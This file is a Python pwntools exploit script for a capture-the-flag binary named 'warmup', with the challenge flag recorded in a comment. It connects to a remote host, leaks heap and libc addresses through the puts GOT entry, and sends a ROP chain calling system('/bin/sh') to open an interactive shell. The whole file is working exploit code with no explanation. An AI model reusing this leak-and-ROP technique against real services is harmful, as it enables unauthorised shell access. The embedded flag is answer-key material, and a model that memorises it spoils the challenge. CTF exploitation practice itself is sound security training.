# coding:utf-8
#*ctf{h0pe_th1s_e4zy_gam3_warm_y0u_up}
from pwn import *
#libc = ELF("/home/moonagirl/moonagirl/libc/libc_local_x64")
libc = ELF("./libc.so")
elf = ELF('./warmup')
context.log_level = 'debug'
LOCAL = 0
if LOCAL:
    io = process('./warmup')#,env={"LD_PRELOAD":"./libc-2.24.so"})
else:
    io = remote('47.91.226.78',10006)

def z(a=''):
	gdb.attach(io,a)
	if a == '':
		raw_input()

def mmenu(choice):
    io.recvuntil("Your choice:")
    io.sendline(choice)

def pwnit():
	io.recvuntil('What are you looking for?\n')

	io.sendline(str(0x601030))
	data = io.recvline()
	heap = int(data,16)
	success('heap:'+hex(heap))

	io.recvuntil('What\'s your name?\n')

	payload = p64(heap)*5 

	payload += p64(0x00000000004008B9)

	io.sendline(payload)



	io.recvuntil('What are you looking for?\n')

	io.sendline(str(elf.got['puts']))
	data = io.recvline()
	puts_addr = int(data,16)
	success('puts_addr:'+hex(puts_addr))

	puts_libc = libc.symbols['puts']
	libc_base = puts_addr - puts_libc
	system_libc = libc.symbols['system']
	binsh_libc = next(libc.search('/bin/sh'))
	system_addr = libc_base + system_libc
	binsh_addr = libc_base + binsh_libc

	io.recvuntil('What\'s your name?\n')

	payload = p64(heap + 0x20)*5 
	payload += p64(0x0000000000021102 + libc_base)#0x0000000000021102 : pop rdi ; ret
	payload += p64(binsh_addr)
	payload += p64(system_addr)
	payload += p64(0x00000000004008B9)

	io.sendline(payload)

#0x0000000000400a61 : pop rsi ; pop r15 ; ret


#0x0000000000400a63 : pop rdi ; ret
#	z()
	io.interactive()

    
if __name__ == "__main__":
    pwnit()